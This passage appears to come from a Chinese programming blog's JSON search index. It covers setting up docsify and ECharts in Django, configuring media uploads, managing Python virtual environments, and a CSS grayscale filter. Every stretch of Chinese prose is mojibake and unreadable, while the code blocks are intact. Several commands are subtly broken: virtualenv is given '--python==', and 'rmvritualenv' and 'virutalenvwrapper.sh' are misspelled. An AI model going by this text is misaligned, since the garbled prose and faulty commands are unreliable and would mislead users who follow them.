æ–‡ä»¶å¤¹ä¸­ï¼ˆä¸‹å›¾æˆ‘å·²ç»åšäº†ä¸€äº›æ–‡æ¡£é…ç½®ï¼Œæ‰€ä»¥å¤šäº†ä¸€äº›æ–‡ä»¶ï¼‰\n\n![](https://img.jwt1399.top//img/20210131110537.png)\n\n3.å°† `docs` ä¸­çš„ `index.html` æ”¾å…¥ `templates` æ–‡ä»¶å¤¹ä¸­ï¼Œæˆ‘è¿™é‡Œå°† `index.html` æ”¹ä¸ºäº† `docs.html`\n\n![](https://img.jwt1399.top//img/20210131111242.png)\n\n4.åœ¨ `docs.html` ä¸­è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„\n\n```js\n<script>\n    window.$docsify = {\n    basePath:'/static/docs/',\n    ...\n    ...\n\t}\n</script>\n```\n\n5.åœ¨`view.py`å¢åŠ ä¸€ä¸ªè§†å›¾,è¿”å›æ–‡æ¡£é¦–é¡µ `docs.html`\n\n```python\ndef docs(request):\n    return render(request, 'docs.html')\n```\n6.åœ¨`urls.py`ä¸­å¢åŠ ä¸€ä¸ªè·¯ç”±\n\n```python\npath('docs', views.docs, name='docs'),\n```\n\n7.è¿è¡Œ Django é¡¹ç›®ï¼Œè®¿é—® `127.0.0.1:8000/docs` å°±å¯ä»¥æˆåŠŸçœ‹åˆ°æ–‡æ¡£é¡µäº†\n\n## Djangoå¼•å…¥Echarts\n\n### Echartsä»‹ç»\n\n>**EChartsï¼š**ç™¾åº¦å‡ºå“çš„ä¸€ä¸ªå¼€æº Javascript æ•°æ®å¯è§†åŒ–åº“ï¼Œå¯ä»¥æµç•…çš„è¿è¡Œåœ¨ PC å’Œç§»åŠ¨è®¾å¤‡ä¸Šï¼Œå…¼å®¹å½“å‰ç»å¤§éƒ¨åˆ†æµè§ˆå™¨ï¼ˆIE8/9/10/11ï¼ŒChromeï¼ŒFirefoxï¼ŒSafariç­‰ï¼‰ï¼Œåº•å±‚ä¾èµ–çŸ¢é‡å›¾å½¢åº“ [ZRender](https://github.com/ecomfe/zrender)ï¼Œæä¾›ç›´è§‚ï¼Œäº¤äº’ä¸°å¯Œï¼Œå¯é«˜åº¦ä¸ªæ€§åŒ–å®šåˆ¶çš„æ•°æ®å¯è§†åŒ–å›¾è¡¨ã€‚\n>\n>**å®˜ç½‘ï¼š**https://echarts.apache.org/zh/index.html\n>\n>**ç¤¾åŒºï¼š**https://www.makeapie.com/explore.html#sort=rank~timeframe=all~author=all\n\n### Echartsåˆä½“éªŒ\n\n**å®˜æ–¹æ•™ç¨‹ï¼š**[äº”åˆ†é’Ÿä¸Šæ‰‹ECharts](https://echarts.apache.org/zh/tutorial.html#5%20%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8B%20ECharts)\n\n**ä½¿ç”¨æ­¥éª¤ï¼š**\n\n1. å¼•å…¥ `echarts.js` æ–‡ä»¶\n\n```js\n<script src=\"{% static 'js/echarts.min.js' %}\"></script>\n```\n\nâ€‹\t2.   å‡†å¤‡ä¸€ä¸ªå…·å¤‡å¤§å°çš„ DOM å®¹å™¨\n\n```html\n<div id=\"main\" style=\"height:400px;\"></div>\n```\n\n3.  åˆå§‹åŒ– echarts å®ä¾‹å¯¹è±¡\n\n```js\nvar myChart = echarts.init(document.getElementById('main'));\n```\n\n4. æŒ‡å®šé…ç½®é¡¹å’Œæ•°æ®(option)\n\n```js\nvar option = {\n    xAxis: {\n        type: 'category',\n        data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']\n    },\n    yAxis: {\n        type: 'value'\n    },\n    series: [{\n        data: [820, 932, 901, 934, 1290, 1330, 1320],\n        type: 'line'\n    }]\n};\n```\n\n5. å°†é…ç½®é¡¹è®¾ç½®ç»™ echarts å®ä¾‹å¯¹è±¡\n\n```js\nmyChart.setOption(option);\n```\n\n\n### å›¾è¡¨è·Ÿéšå±å¹•å¤§å°è‡ªé€‚åº”\n\n```js\n  window.addEventListener(\"resize\", function() {\n    myChart1.resize();\n    myChart2.resize();\n  });\n```\n\n## Djangoå®ç°æ–‡ä»¶ä¸Šä¼ \n\nä»¥ä¸‹å†…å®¹è½¬è½½è‡ªï¼šhttps://segmentfault.com/a/1190000021960355\n\n### media & MEDIA_ROOT çš„é…ç½®\n\né¦–å…ˆæˆ‘ä»¬åœ¨è‡ªå·±çš„Djangoé¡¹ç›®ä¸­åˆ›å»ºä¸€ä¸ª**media**æ–‡ä»¶å¤¹ï¼š\n![](https://img.jwt1399.top//img/20210221135916)\n\nç„¶ååœ¨`settings.py`ä¸­è®¾ç½®`MEDIA_ROOT`ï¼š\n\n```python\nMEDIA_ROOT = os.path.join(BASE_DIR,'media')\n \n# ä¸Šä¼ åˆ°è‡ªå·±æŒ‡å®šappçš„è·¯å¾„ä¸‹ï¼ˆä¾‹å¦‚ä¸Šä¼ åˆ°webscanä¸‹é¢çš„staticç›®å½•ä¸‹çš„mediaä¸­)\n# MEDIA_ROOT = os.path.join(BASE_DIR,'webscan','static/media')\n```\n\næ¥ç€åœ¨`urls.py`ä¸­è®¾ç½®**media**è·¯ç”±çš„ç›¸å…³é…ç½®ï¼š\n\n```python\nfrom django.urls import path,re_path\nfrom django.views.static import serve\nfrom cnblog import settings\n\n##mediaé…ç½®â€”â€”é…åˆsettingsä¸­çš„MEDIA_ROOTçš„é…ç½®ï¼Œå°±å¯ä»¥åœ¨æµè§ˆå™¨çš„åœ°å€æ è®¿é—®mediaæ–‡ä»¶å¤¹åŠé‡Œé¢çš„æ–‡ä»¶äº†\nre_path(r'media/(?P<path>.*)$',serve,{'document_root':settings.MEDIA_ROOT}),\n```\n\næœ‰äº†ä¸Šé¢è¿™ä¸ªè·¯ç”±è®¾ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æµè§ˆå™¨çš„åœ°å€æ æ ¹æ®mediaæ–‡ä»¶å¤¹ä¸­æ–‡ä»¶çš„è·¯å¾„å»è®¿é—®å¯¹åº”çš„æ–‡ä»¶äº†ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ä¸ºäº†ä¿è¯å®‰å…¨ï¼Œé»˜è®¤æƒ…å†µä¸‹Djangoé¡¹ç›®ä¸­å„ç›®å½•çš„æ–‡ä»¶æ˜¯ä¸èƒ½é€šè¿‡åœ°å€æ å»è®¿é—®çš„ï¼‰ã€‚\n\nå½“ç„¶ï¼Œæˆ‘ä»¬è¿™é‡Œå®ç°çš„æ˜¯æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œéœ€è¦å°†æ–‡ä»¶ä¿¡æ¯ä¼ ç»™æ•°æ®åº“ä¿å­˜ï¼Œ`models.py`æ–‡ä»¶ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š\n\n```python\nclass UserInfo(models.Model):\n    nid = models.AutoField(primary_key=True)\n    ##å¤´åƒæ˜¯ä¸€ä¸ªFileFieldâ€”â€”æ³¨æ„è¿™é‡Œå¿…é¡»æ˜¯â€œç›¸å¯¹è·¯å¾„â€ï¼Œä¸èƒ½æ˜¯/avatars/è¿™æ ·çš„ç»å¯¹è·¯å¾„\n    avatar = models.FileField(upload_to='avatars/',default='avatars/default.jpg')\n```\n\næˆ‘ä»¬ç”¨`FileField`å­˜æ”¾ä¸Šä¼ çš„æ–‡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼š**mediaæ–‡ä»¶å¤¹**æ˜¯æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„ **æ ¹ç›®å½•**ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å†ä¸ºè¿™ä¸ªâ€œæ ¹ç›®å½•â€æŒ‡å®šâ€œå­ç›®å½•â€çš„è¯éœ€è¦é€šè¿‡å‚æ•°`upload_to`å»æŒ‡å®šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¼šä¿å­˜åœ¨ **/media/avatarsç›®å½•** ä¸‹ï¼Œåé¢çš„å‚æ•°`default`è¡¨ç¤ºé»˜è®¤å›¾åƒâ€”â€”â€”â€”æ¯”å¦‚è¯´æˆ‘ä»¬æƒ³è¦ä¸Šä¼ å¤´åƒï¼Œç”¨æˆ·ä¸æŒ‡å®šå¤´åƒçš„æ—¶å€™å°±ç”¨`default`å‚æ•°æŒ‡å®šçš„å›¾ç‰‡ã€‚\n\n```\nè¿™é‡Œçœç•¥æ¨¡æ¿ä¸è§†å›¾å‡½æ•°çš„å®ç°ï¼Œåªè¯´æ˜mediaå‚æ•°çš„ç”¨æ³•\n```\n\nå½“æˆ‘ä»¬å°†å›¾ç‰‡ä¸Šä¼ åˆ°æœåŠ¡å™¨åï¼Œå°±ä¼šåœ¨æˆ‘ä»¬æŒ‡å®šçš„ç›®å½•çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶äº†ï¼š\n![](https://img.jwt1399.top//img/20210221141044)\n\n### ä¸Šä¼ æ–‡ä»¶çš„è®¿é—®\n\n#### æ–‡ä»¶çš„è®¿é—®ç®€ä»‹\n\nå…¶å®ï¼Œå½“æˆ‘ä»¬åœ¨ä¸Šé¢è¿›è¡Œäº†`MEDIA_ROOT`ä¸è·¯ç”±çš„ç›¸å…³é…ç½®åï¼Œåœ¨æµè§ˆå™¨è¾“å…¥æ–‡ä»¶çš„è·¯å¾„å°±å¯ä»¥æŸ¥çœ‹å¯¹åº”çš„æ–‡ä»¶äº†ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³æŸ¥çœ‹ä¸Šå›¾ä¸­çš„222.jpgæ–‡ä»¶ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™åœ¨åœ°å€æ è¾“å…¥ï¼š\n\n```\nhttp://127.0.0.1:8000/media/avatars/222.jpg\n```\n\nè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºè¿™ä¸ªå›¾ç‰‡äº†ã€‚\n\nä½†æ˜¯å®é™…ä¸­ï¼Œç”¨æˆ·ä¸å¯èƒ½å»åœ°å€æ è¾“å…¥æ–‡ä»¶è·¯å¾„çš„ï¼Œæˆ‘ä»¬åšç¨‹åºçš„ç›®çš„å°±æ˜¯å°½æœ€å¤§é™åº¦çš„è§£æ”¾ç”¨æˆ·çš„æ“ä½œâ€”â€”â€”â€”é‚£ä¹ˆï¼Œæ˜¯å¦æœ‰ä¸€ç§æ–¹æ³•èƒ½å¤Ÿè®©ç”¨æˆ·ä»…ä»…ç‚¹å‡»ä¸€ä¸‹å°±èƒ½æŸ¥çœ‹åˆ°å¯¹åº”çš„æ–‡ä»¶å‘¢ï¼Ÿ\nç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼\n\nè¿™å°±ç”¨åˆ°äº†mediaçš„å¦å¤–ä¸€ä¸ªå‚æ•°â€”â€”â€”â€”`MEDIA_URL`ã€‚\n\n#### MEDIA_URL\n\nåœ¨ä½¿ç”¨`MEDIA_URL`ä¹‹å‰æˆ‘ä»¬éœ€è¦æ–°å¢ä¸€æ¡ä¸­é—´ä»¶ï¼Œåœ¨`settings.py`æ–‡ä»¶çš„`TEMPLATES`å‚æ•°ä¸­åŠ å…¥ä¸­é—´ä»¶ï¼š\n\n```python\ndjango.template.context_processors.media\n```\n\nç„¶åæˆ‘ä»¬åœ¨`settings.py`ä¸­åŠ å…¥`MEDIA_URL`çš„å‚æ•°ï¼š\n\n```\nMEDIA_URL = '/media/'\n```\n\næ¥ç€æˆ‘ä»¬å†æ–°å¢ä¸€æ¡æµ‹è¯•è·¯ç”±ï¼š\n\n```\n##æµ‹è¯•\npath('aa/bb',views.aa),\n```\n\nè§†å›¾ä¹Ÿæ¯”è¾ƒç®€å•ï¼š\n\n```\ndef aa(request):\n    return  render(request,'aa.html')\n```\n\nç„¶åæ¨¡æ¿æ–‡ä»¶ä¸­æˆ‘ä»¬åšç›¸åº”çš„åŠŸèƒ½ï¼š\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<a href=\"{{ MEDIA_URL }}avatars/222.jpg\">æŸ¥çœ‹mediaç›®å½•ä¸‹çš„ä¸€å¼ å›¾ç‰‡</a>\n<p>MEDIA_URL: {{ MEDIA_URL }}</p>\n</body>\n</html>\n```\n\nå‡å¦‚æˆ‘ä»¬æƒ³å®ç°ç‚¹å‡»aæ ‡ç­¾çš„æ–‡å­—å‡ºæ¥222.jpgå›¾ç‰‡ï¼Œå¯ä»¥åœ¨hrefåŠ ä¸Šå›¾ç‰‡çš„è·¯å¾„ï¼Œè¿™é‡Œå¤§å®¶çœ‹åˆ°äº†ï¼Œæˆ‘ä»¬ç”¨æ¨¡æ¿è¯­è¨€`{{ MEDIA_URL }}`è¿›è¡Œæ¸²æŸ“ï¼Œè¿™é‡Œæ¨¡æ¿è¯­è¨€æ¸²æŸ“å‡ºæ¥çš„å€¼å…¶å®å°±æ˜¯æˆ‘ä»¬åœ¨settingsä¸­è®¾ç½®çš„'/media/'ã€‚æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æ¼”ç¤ºæ•ˆæœï¼š\n\n![](https://img.jwt1399.top//img/20210221141321)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç‚¹å‡»é“¾æ¥çš„è®¿é—®æ•ˆæœä¸åœ¨æµè§ˆå™¨çš„åœ°å€æ è¾“å…¥æ–‡ä»¶è·¯å¾„çš„æ•ˆæœä¸€æ ·ã€‚\nå¯èƒ½æœ‰äººä¼šé—®äº†ï¼Œæ—¢ç„¶æ•ˆæœä¸€æ ·ï¼Œé‚£ä¸ºä½•ä¸åœ¨æ¨¡æ¿ä¸­ç›´æ¥å°†aæ ‡ç­¾çš„hrefå†™æ­»å‘¢ï¼Œä½•å¿…ç”¨æ¨¡æ¿è¯­è¨€å»æ¸²æŸ“ï¼Ÿï¼\nå½“ç„¶ï¼ŒäºŒè€…çš„æ•ˆæœå›ºç„¶ä¸€æ ·ï¼Œä½†æ˜¯å½“æˆ‘ä»¬çš„é¡¹ç›®åšå¤§çš„æ—¶å€™ï¼Œæ–‡ä»¶ç›®å½•çš„ç»„ç»‡å½¢å¼ä¼šè¶Šæ¥è¶Šå¤æ‚ï¼Œåœ¨settingsä¸­è®¾ç½®è¿™æ ·ä¸€ä¸ªæˆ–è€…å‡ ä¸ªå›ºå®šçš„ã€å®¹æ˜“è®°å¿†çš„å˜é‡å»å­˜å‚¨å¤æ‚çš„æ–‡ä»¶è·¯å¾„ï¼Œæˆ‘ä»¬åœ¨å¼€å‘çš„æ—¶å€™å°±ä¸ä¼šä¸ºè¿™äº›â€œçäº‹â€å»åŠ¨è„‘ç­‹äº†ï¼Œè¿™æ ·èƒ½å¤Ÿæå¤§çš„æé«˜æˆ‘ä»¬çš„ç¼–ç¨‹æ•ˆç‡ã€‚","tags":["Django"],"categories":["Python"]},{"title":"Pythonï¼šè™šæ‹Ÿç¯å¢ƒ","url":"/posts/26224.html","content":"\n## è™šæ‹Ÿç¯å¢ƒ\n\n> å½“åšä¸€ä¸ªé¡¹ç›®æ—¶ï¼Œå¯èƒ½ä¼šç”¨åˆ°ä¸€äº›æ¨¡å—ï¼Œå¦‚æœæŠŠæ‰€æœ‰çš„æ¨¡å—éƒ½å®‰è£…åœ¨ä¸»æœºpythonç¯å¢ƒä¸­ï¼Œå¾ˆå®¹æ˜“ä½¿å¾—è‡ªå¸¦pythonç¯å¢ƒååˆ†è‡ƒè‚¿ï¼Œè€Œä¸”åˆ°æ—¶å€™å¦‚æœè¿ç§»åˆ°åˆ«çš„ç”µè„‘æ—¶è¿˜éœ€è¦é‡æ–°å®‰è£…å¯¹åº”æ¨¡å—ï¼Œæ‰€ä»¥å¯ä»¥ç”¨è™šæ‹Ÿç¯å¢ƒï¼Œåœ¨ä¸åŒçš„ç¯å¢ƒä¸‹å®‰è£…å¯¹åº”çš„æ¨¡å—ï¼Œè¿ç§»æ—¶ä¹ŸæŠŠæ•´ä¸ªç¯å¢ƒè¿ç§»è¿‡å»å³å¯\n\nè™šæ‹Ÿç¯å¢ƒçš„ä½œç”¨ï¼šé¡¹ç›®ä¹‹é—´ç¯å¢ƒéš”ç¦»\nå¼€å‘ï¼šæœ¬åœ°ç¯å¢ƒ\nçº¿ä¸Šï¼šå¤šç¯å¢ƒéš”ç¦»\n\n## ä¸€ã€Linuxç”¨æˆ·\n\n### 1.å®‰è£…virtualenv\n\n```bash\nsudo pip3 install virtualenv\n```\n### 2.å®‰è£…virtualenvæ‰©å±•ç®¡ç†å·¥å…·virtualenvwrapper\n\n```bash\nsudo pip3 install virtualenvwrapper\n```\n> é€šè¿‡virtualenvæ¥åˆ›å»ºè™šæ‹Ÿç¯å¢ƒæ—¶ï¼Œä¸ç®¡æ˜¯åˆ›å»ºè¿˜æ˜¯æ¿€æ´»çš„æ—¶å€™éƒ½è¦å…ˆcdåˆ°å…·ä½“çš„ç›®å½•ä¸‹å»ï¼Œè¿™æ ·æ˜¾å¾—ä¸æ–¹ä¾¿ã€‚å¯ä»¥ä½¿ç”¨virtualenvwrapperæ¥ç®¡ç†è™šæ‹Ÿç¯å¢ƒã€‚\n### 3. é…ç½®''.bashrc''æ–‡ä»¶\n\n> Ubuntuä¸­'.bashrc'æ–‡ä»¶é»˜è®¤ä½ç½®åœ¨'~/.bashrc',å±äºéšè—æ–‡ä»¶ï¼Œå¯æŒ‰ctrl+h æ˜¾ç¤ºéšè—æ–‡ä»¶ã€‚æ‰“å¼€ååœ¨æ–‡ä»¶æœ«å°¾åŠ å…¥æ­¤æ®µå†…å®¹ã€‚\n>\n> å¦‚æœå®‰è£…äº† Oh My Zsh  å°±åœ¨.zshrcä¸­åŠ \n```bash\nexport VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3\nexport WORKON_HOME=$HOME/.virtualenvs\nsource /usr/local/bin/virtualenvwrapper.sh\n```\n- > VIRTUALENVWRAPPER_PYTHON ï¼š æŒ‡å®špython3è§£é‡Šå™¨çš„è·¯å¾„\n- > WORKON_HOME ï¼š æŒ‡å®šè™šæ‹Ÿç¯å¢ƒçš„é»˜è®¤å­˜æ”¾ä½ç½®\n- > source ï¼šæ¯æ¬¡ç™»å½•è‡ªåŠ¨æ‰§è¡Œçš„è„šæœ¬\n\n### 4. è®©'.bashrc'ç”Ÿæ•ˆ\n\n```bash\nsource ~/.bashrc\n\nsource ~/.zshrc #å®‰è£…äº†Oh My Zshä½¿ç”¨è¿™ä¸ª\n```\n> è‹¥æç¤º bash:/home/.../local/bin/virtualenvwrappper.shï¼š No shch file or directory,å…¶åŸå› æ˜¯ä½ åœ¨å®‰è£…virtualenvwrapperæ—¶ï¼Œä½ æ²¡æœ‰åœ¨å‰é¢åŠ ä¸Šsudoï¼Œä½ å¯ä»¥ä½¿ç”¨sudo pip3 uninstall virtualenvwrapperå°†å…¶å¸è½½åï¼Œé‡æ–°åŠ ä¸Šsudoå‘½ä»¤é‡è£…ï¼Œæˆ–å°†'.bashrc'æ–‡ä»¶ä¸­çš„source æ¢æˆå¦‚ä¸‹è¯­å¥ã€‚\n```bash\nsource ~/.local/bin/virutalenvwrapper.sh\n```\n### 5. åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ\n\n- python 2.7\n```bash\nmkvirtualenv VM_name # VM_name è¡¨ç¤ºä½ çš„è™šæ‹Ÿç¯å¢ƒçš„åç§°\n```\n- python 3.x\n```bash\nmkvirtualenv -p python3 VM_name\n```\n\n![](https://i.loli.net/2020/04/06/sOXyeLwzqWfAaEC.png)\n\n###  6. è¿›å…¥è™šæ‹Ÿç¯å¢ƒ\n\n> åœ¨ubuntu 18ä¸­ï¼Œåˆ›å»ºå¥½ç¯å¢ƒåï¼Œä¼šè‡ªåŠ¨è¿›å…¥ä½ çš„è™šæ‹Ÿç¯å¢ƒã€‚å‘½ä»¤è¡Œå‰ä¼šå‡ºç°ä½ çš„è™šæ‹Ÿç¯å¢ƒåç§°ã€‚\n```bash\nworkon VM_name  \n```\n![](https://i.loli.net/2020/04/06/HTWYtux3hVXaS1o.png)\n\n### 7. é€€å‡ºå½“å‰è™šæ‹Ÿç¯å¢ƒ\n\n```bash\ndeactivate\n```\n### 8. å…¶ä»–è™šæ‹Ÿç¯å¢ƒå‘½ä»¤\n\n- åˆ—å‡ºæ‰€æœ‰è™šæ‹Ÿç¯å¢ƒ\n```bash\nlsvirtualenv\n```\n![](https://i.loli.net/2020/04/06/GL6fjrBHRlp83uz.png)\n\n- è¿›å…¥è™šæ‹Ÿç¯å¢ƒç›®å½•\n```bash\ncdvirtualenv\n```\n![](https://i.loli.net/2020/04/06/A3DZN1hGkX5962F.png)\n\n- è¿›å…¥è™šæ‹Ÿç¯å¢ƒçš„site-packagesç›®å½•\n```bash\ncdsitepackages\n```\n- åˆ é™¤è™šæ‹Ÿç¯å¢ƒ\n```bash\nrmvirtualenv VM_name\n```\n\n![](https://i.loli.net/2020/04/06/J3VAn7ySR6kcQ1o.png)\n\n## äºŒã€windowsç”¨æˆ·\n\n### 1.å®‰è£…virtualenv\n\n```bash\npip3 install virtualenv\n```\n### 2. å®‰è£…virtualenvwrapper\n\n> ä¸ºäº†ä½¿ç”¨virtualenvæ›´æ–¹ä¾¿ï¼Œå¯ä»¥å€ŸåŠ© virtualenvwrapper\n\n```bash\npip install virtualenvwrapper-win\n```\n\n#### 2.1 é…ç½®ç¯å¢ƒå˜é‡\n\nå¦‚æœä¸é…ç½®ç¯å¢ƒå˜é‡,åˆ›å»ºåçš„è™šæ‹Ÿç¯å¢ƒé»˜è®¤å­˜å‚¨åœ¨å½“å‰ç”¨æˆ·`(C:/Users/xxx)`ä¸‹`Env`æ–‡ä»¶å¤¹ä¸‹ï¼Œå¦‚æœä½ æƒ³è¦æŠŠè™šæ‹Ÿç¯å¢ƒå­˜å‚¨åœ¨ä½ æŒ‡å®šçš„å­˜å‚¨è·¯å¾„ï¼Œé‚£ä¹ˆå°±ä¿®æ”¹ç¯å¢ƒå˜é‡\n\næ–°å»ºæœ‰ä¸€ä¸ªå˜é‡åå« `WORKON_HOME` ï¼Œå˜é‡å€¼å°±æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰å­˜æ”¾è™šæ‹Ÿç¯å¢ƒçš„åœ°å€ï¼Œç„¶åç‚¹å‡»ä¿å­˜ï¼Œå°±okäº†\n\næ³¨ï¼šä¸€å®šè¦é‡æ–°æ‰“å¼€ä¸€ä¸ªcmdï¼Œä¸é‡æ–°æ‰“å¼€è¿˜æ˜¯ä¼šå»ºåœ¨`(C:/Users/xxx)`ä¸‹`Env`æ–‡ä»¶å¤¹ä¸‹ï¼Œå¦‚æœè¿˜æ˜¯ä¸è¡Œçš„è¯ï¼Œé‡å¯å“ˆç”µè„‘å°±å¯ä»¥äº†\n\n![](https://i.loli.net/2020/04/09/xg3USrXAa6icpjb.png)\n\n#### 2.2 åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ\n\n```bash\nmkvirtualenv -p python3 VM_name\n\nmkvirtualenv --python==D:\\python\\python.exe my_env #å¯ä»¥è‡ªå·±æŒ‡å®špythonè·¯å¾„\n```\n\n#### 2.3 åˆ‡æ¢åˆ°æŸä¸ªè™šæ‹Ÿç¯å¢ƒ\n\n```\nworkon my_env\n```\n\n#### 2.4 é€€å‡ºå½“å‰è™šæ‹Ÿç¯å¢ƒ\n\n```\ndeactivate\n```\n\n#### 2.5 åˆ é™¤æŸä¸ªè™šæ‹Ÿç¯å¢ƒ\n\n```\nrmvritualenv my_env\n```\n\n#### 2.6 åˆ—å‡ºæ‰€æœ‰è™šæ‹Ÿç¯å¢ƒæ‰€åœ¨ç›®å½•\n\n```\nlsvirtualenv\n```\n\n#### 2.7 è¿›å…¥åˆ°è™šæ‹Ÿç¯å¢ƒæ‰€åœ¨ç›®å½•\n\n```\ncdvirtualenv\n```\n\n#### 2.8.å°†ç¯å¢ƒå¯¼å…¥Pycharm\n\né€‰æ‹©æˆ‘ä»¬ä¸Šé¢åˆ›å»ºå¥½çš„è™šæ‹Ÿç¯å¢ƒ\n\n![](../images/Python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/image-20200406212847887.png)\n\n\n\n### 3 ä¸å®‰è£…virtualenvwrapper\n\n**æ³¨ï¼šå¦‚æœä¸å®‰è£…virtualenvwrapper,å°±ä½¿ç”¨ä¸‹é¢æ–¹æ³•åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼Œä½†æ˜¯å»ºè®®è¿˜æ˜¯è£…ä¸Šï¼Œè£…ä¸Šä½¿ç”¨çš„å‘½ä»¤å°±è·Ÿä¸Šæ–¹linuxä½¿ç”¨å‘½ä»¤ä¸€æ ·**\n\n#### 3.1 åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ\n\n> windowsç”¨æˆ·æœ€å¥½æŒ‡å®šä¸€ä¸ªç›®å½•ä¸“é—¨æ¥å­˜æ”¾åˆ›å»ºçš„è™šæ‹Ÿç¯å¢ƒ\n\n```bash\nF:\ncd py_envs #è¿™æ˜¯æˆ‘æŒ‡å®šçš„ä¸“é—¨å­˜æ”¾è™šæ‹Ÿç¯å¢ƒçš„ç›®å½•\n\nvirtualenv VM_name # VM_name è¡¨ç¤ºä½ çš„è™šæ‹Ÿç¯å¢ƒçš„åç§°\n\nvirtualenv VM_name --python==python3.6\nvirtualenv VM_name --python==python2.7\nvirtualenv VM_name --python=='D:\\python\\python3.6.exe'\n```\n####  3.2 è¿›å…¥è™šæ‹Ÿç¯å¢ƒ\n\n> è¿›å…¥ä½ çš„è™šæ‹Ÿç¯å¢ƒï¼Œå‘½ä»¤è¡Œå‰ä¼šå‡ºç°ä½ çš„è™šæ‹Ÿç¯å¢ƒåç§°ã€‚\n\n```bash\ncd è™šæ‹Ÿç¯å¢ƒçš„Scriptsç›®å½• #cd py_envs/Vm_name/Scripts\n\nactivate.bat #æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ\n```\n\n![](../images/Python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/image-20200406210729415.png)\n\n#### 3.3 é€€å‡ºå½“å‰è™šæ‹Ÿç¯å¢ƒ\n\n```bash\ncd è™šæ‹Ÿç¯å¢ƒçš„Scriptsç›®å½• #cd py_envs/Vm_name/Scripts\n\ndeactivate.bat\n```\n\n## ä¸‰ã€Pycharmç›´æ¥é…ç½®ç¯å¢ƒ\n\n![](https://i.loli.net/2020/04/06/unmKz8C4iXtQy3w.png)\n","tags":["è™šæ‹Ÿç¯å¢ƒ"],"categories":["Python"]},{"title":"CSS filter-ç½‘é¡µå˜ç°","url":"/posts/58488.html","content":"\n**[æœ¬ç«™](https://jwt1399.top)4æœˆ4æ—¥å…¨å¤©å˜ç°ï¼Œå‘é€å»ç”Ÿå‘½è‡´ä»¥å´‡é«˜æ•¬æ„ï¼**\n\n#### CSS filter\n\n> **`filter`** CSS å±æ€§å°†æ¨¡ç³Šæˆ–é¢œè‰²åç§»ç­‰å›¾å½¢æ•ˆæœåº”ç”¨äºå…ƒç´ ã€‚æ»¤é•œé€šå¸¸ç”¨äºè°ƒæ•´å›¾åƒï¼ŒèƒŒæ™¯å’Œè¾¹æ¡†çš„æ¸²æŸ“ã€‚\n\n[å®˜æ–¹Demo](https://developer.mozilla.org/zh-CN/docs/Web/CSS/filter)\n\n![å®˜æ–¹Demo](https://i.loli.net/2020/04/04/GUc74mjC96FngzZ.gif)\n\n#### å…¨ç«™å˜ç°\n\nä»Šå¤©å¾ˆå¤šç½‘ç«™éƒ½å˜ç°äº†ï¼Œæ¯”å¦‚ç®€ä¹¦ã€B ç«™ã€çˆ±å¥‡è‰ºã€CSDN ã€ç™¾åº¦ç­‰ç­‰ã€‚\næˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªç½‘ç«™ï¼Œæ¯”å¦‚ B ç«™å§ï¼Œæ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·ã€‚å®¡æŸ¥ä¸€ä¸‹ç½‘é¡µçš„æºä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ html çš„è¿™ä¸ªåœ°æ–¹å¤šäº†ä¸€ä¸ªç–‘ä¼¼çš„ `class`ï¼Œå«åš `gray`ï¼ˆç°è‰²ï¼‰\n\n![1.gif](https://i.loli.net/2020/04/04/1UrPTsv9ZlkmiAy.gif)\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åªè¦å°†ä¸‹é¢ CSS æ ·å¼ï¼ŒåŠ å…¥åˆ°é¡µé¢æŒ‡å®šèŠ‚ç‚¹ï¼Œå³å¯å®ç°ç½‘é¡µå˜ç°çš„æ•ˆæœï¼Œæˆ‘ä»¬å°†å…¶å–æ¶ˆï¼Œå°±èƒ½å‘ç°ç½‘ç«™çš„é¢œè‰²å°±èƒ½é‡æ–°è¿˜åŸå›æ¥äº†ã€‚\n\n```Css\n\nhtml.gray {\n    -webkit-filter: grayscale(.95);\n}\n```\n\n> grayscale å–å€¼ä¸º 0%-100%ï¼Œä¹Ÿå¯ä»¥ç”¨ 0-1 å–ä»£ï¼Œ0%ä»£è¡¨å½©è‰²å›¾åƒï¼Œ100%ä»£è¡¨å®Œå…¨çš„ç°åº¦ã€‚\n\nå¦å¤–çœ‹çœ‹æˆ‘è‡ªå·±çš„ç«™ç‚¹ï¼Œæˆ‘ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ª CSS æ ·å¼\n\n![image-20200404183434183.png](https://i.loli.net/2020/04/04/a61jfGbm3rORYhq.png)\n\nå› 